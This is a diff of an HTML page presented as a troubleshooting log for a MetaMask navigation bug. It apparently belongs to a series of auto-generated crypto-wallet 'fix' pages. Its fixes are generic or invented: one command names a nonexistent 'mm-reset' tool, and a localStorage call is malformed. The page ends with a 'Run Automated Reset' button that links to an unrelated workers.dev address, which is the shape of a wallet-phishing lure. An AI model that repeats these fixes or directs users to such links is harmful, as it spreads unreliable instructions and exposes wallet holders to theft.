@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: system-ui;
-        background: #1a1a24;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #00adb5; }
     .btn {
-        background: #ff7b2c;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,30 +42,30 @@
 <h1>Metamask Extension Bug Trying To Navigate Back From The Manage Network Page</h1>
 <h2>Symptom</h2>
 <ul>
-<li>When attempting to navigate back from the Manage Network page, Metamask displays an incorrect page or fails to return to the expected screen, resulting in a confusing user experience.</li>
+<li>When attempting to navigate back from the Manage Network page in Metamask, the user is displayed an incorrect page or an error message, instead of being redirected to the expected previous page.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The issue arises from a bug within the Metamask extension, specifically related to its navigation and state management when interacting with the Manage Network page.</li>
+<li>This error occurs due to a bug in the Metamask extension's navigation handling, specifically when transitioning from the Manage Network page. The extension fails to properly track the navigation history, resulting in an incorrect page being displayed when the user attempts to navigate back.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following steps:</li>
-<li>Clear the browser cache and restart the browser to ensure a fresh start.</li>
-<li>Remove and re-add the Ethereum network in Metamask to reset network settings.</li>
-<li>Execute the following command in a terminal to reset Metamask settings:</li>
+<li>To resolve this issue, users can try the following manual overrides:</li>
+<li>Clearing the browser's cache and cookies</li>
+<li>Disabling and re-enabling the Metamask extension</li>
+<li>Using the following command to reset the extension's navigation state:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>mm-reset<span class="w"> </span>--network.eth
+<div class="codehilite"><pre><span></span><code>localStorage.clear<span class="o">(</span><span class="s2">&quot;metamask_navigation_state&quot;</span><span class="o">)</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex troubleshooting and configuration adjustments.</p>
+<p>Consider accessing the browser's developer console for further troubleshooting. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured</li>
-<li>Ethereum network added in Metamask</li>
-<li>Basic understanding of browser cache management and terminal commands</li>
+<li>Metamask extension installed and enabled</li>
+<li>Browser cache and cookies cleared</li>
+<li>Familiarity with browser developer console usage</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-networks-after-deleting-a-custom-rpc-for.html">Metamask Extension Bug Networks After Deleting A Custom Rpc For</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-p0-investigate-and-cap-multichain-account-cr.html">Metamask Extension P0 Investigate And Cap Multichain Account Creation/Syncing Span Fan-Out</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-swaps-changing-the-destination-token-cha.html">Metamask Extension Bug Swaps Changing The Destination Token Cha</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
